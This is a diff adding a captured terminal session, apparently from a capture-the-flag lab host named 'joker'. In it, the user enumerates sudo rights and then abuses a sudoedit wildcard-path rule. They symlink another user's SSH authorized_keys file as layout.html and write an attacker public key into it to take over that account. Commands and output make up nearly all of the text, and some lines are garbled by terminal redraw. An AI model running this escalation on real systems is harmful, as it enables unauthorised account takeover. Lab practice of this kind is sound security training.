@@ -1,0 +1,82 @@
+manage-shorty.py: Python script, ASCII text executable                                 
+werkzeug@joker:~$ file shorty              
+shorty: directory                          
+werkzeug@joker:~$ cd shorty                
+werkzeug@joker:~/shorty$ ls                
+application.py   __init__.py   models.pyc  utils.py   views.pyc                        
+application.pyc  __init__.pyc  static      utils.pyc                                   
+data             models.py     templates   views.py                                    
+werkzeug@joker:~/shorty$ cd ..             
+werkzeug@joker:~$ file testing             
+testing: directory                         
+werkzeug@joker:~$ cd testing/              
+werkzeug@joker:~/testing$ ls               
+layout.html                                
+werkzeug@joker:~/testing$ cat layout.html  
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"                                      
+ "http://www.w3.org/TR/html4/strict.dtd">  
+<html>                                     
+<head>                                     
+  <title>Shorty</title>                    
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', file='style.css') }}">                                                                                     
+</head>                                    
+<body>                                     
+  <h1><a href="{{ url_for('new') }}">Shorty</a></h1>                                   
+  <div class="body">{% block body %}{% endblock %}</div>                               
+  <div class="footer">                     
+    <a href="{{ url_for('new') }}">new</a> |                                           
+    <a href="{{ url_for('list') }}">list</a> |                                         
+    use shorty for good, not for evil      
+  </div>                                   
+</body>                                    
+</html>                                    
+werkzeug@joker:~/testing$ clear            
+werkzeug@joker:~/testing$ export TERM=screen-256color                                  
+werkzeug@joker:~/testing$                  
+werkzeug@joker:~/testing$ sudo -l          
+Matching Defaults entries for werkzeug on joker:                                       
+    env_reset, mail_badpass,               
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,                                                                                  
+    sudoedit_follow, !sudoedit_checkdir    
+
+User werkzeug may run the following commands on joker:                                 
+    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html                               
+werkzeug@joker:~/testing$ dpkg -l sudo     
+Desired=Unknown/Install/Remove/Purge/Hold  
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend         
+|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)                             
+||/ Name           Version      Architecture Description                               
++++-==============-============-============-=================================         
+ii  sudo           1.8.16-0ubun amd64        Provide limited super user privil         
+werkzeug@joker:~/testing$ mkdir arrow      
+werkzeug@joker:~/testing$ cd arrow/        
+werkzeug@joker:~/testing/arrow$ ln -s /home/alekos/.ssh/authorized_keys                
+tmlkzeug@joker:~/testing/arrow$ ln -s /home/alekos/.ssh/authorized_keys layout.h       
+werkzeug@joker:~/testing/arrow$ ls         
+authorized_keys  layout.html               
+werkzeug@joker:~/testing/arrow$ ls-la      
+ls-la: command not found                   
+werkzeug@joker:~/testing/arrow$ ls -la     
+total 8                                    
+drwxrwxr-x 2 werkzeug werkzeug 4096 Jan  2 02:38 .                                     
+drwxr-xr-x 3 werkzeug werkzeug 4096 Jan  2 02:36 ..                                    
+lrwxrwxrwx 1 werkzeug werkzeug   33 Jan  2 02:38 authorized_keys -> /home/alekos/.ssh/authorized_keys                                                                          
+lrwxrwxrwx 1 werkzeug werkzeug   33 Jan  2 02:38 layout.html -> /home/alekos/.ssh/authorized_keys                                                                              
+htmlzeug@joker:~/testing/arrow$ sudoedit -u alekos /var/www/testing/gyan/layout.       
+sudoedit: /var/www/testing/gyan/                                                       
+.htmleug@joker:~/testing/arrow$ sudoedit -u alekos /var/www/testing/arrow/layout       
+Unable to create directory /var/www/.nano: Permission denied                           
+It is required for saving/loading search history or cursor positions.                  
+
+Press Enter to continue                    
+
+werkzeug@joker:~/testing/arrow$ clearotNWccypbeweRis5XMBaquFPYmzeq3PFnzm1RmsiHzfY76V9i0b1itdgFTL1L+pSNEe9/G81ulIJcH+D2ibaS5tsa1CCdTJ7HVMYxxpdpHa7EdGzsrERzCJ4lhpJApmu9HY6cXROd3
+werkzeug@joker:~/testing/arrow$ cat authorized_keys                                    
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDm5G7Aqh7cKmNSCxKxAOM4YY+3J1S3CozvtCJLRzzzWVkeiMbKNkiD5/osF+Qpcur4h4AZT80L40TROPqKFThyCwIjZxJhaMOf19xIaKrX7fZCwM5e0LCqOvOgFTab1f4zVYxIP78wldOqv++wDisNHeCUUwncZWFWrTCun6YS0m2tKcEiXTO6dSmZ5T8hHP0NQTwkRKovECEr3eLrWbHbyfSmi1IZ5dbb5ZjtRhV/l02wAT31Xl1hvN6YXf5Q8k/D5Nv+K9/3QxwOtGXnx3doYVOcwrzlyWWQXLE+lUY9kGwZ5R2GDmOFq94d5bggWBAx5YSGpFYyTJ1CymzaU2tmviMREWuhaNWccypbeweRis5XMBaquFPYmzeq3PFnzm1RmsiHzfY76V9i0b1itdgFTL1L+pSNEe9/G81ulIJcH+D2ibaS5tsa1CCdTJ7HVMYxxpdpHa7EdGzsrERzCJ4lhpJApmu9HY6cXROd3AoHoEmAxdOw8coJYl7nLJ6Yv5s= root@parrot    
+
+werkzeug@joker:~/testing/arrow$ cd ../..   
+werkzeug@joker:~$ pwd                      
+/var/www                                   
+werkzeug@joker:~$ exit                     
+exit                                       
+$                                          
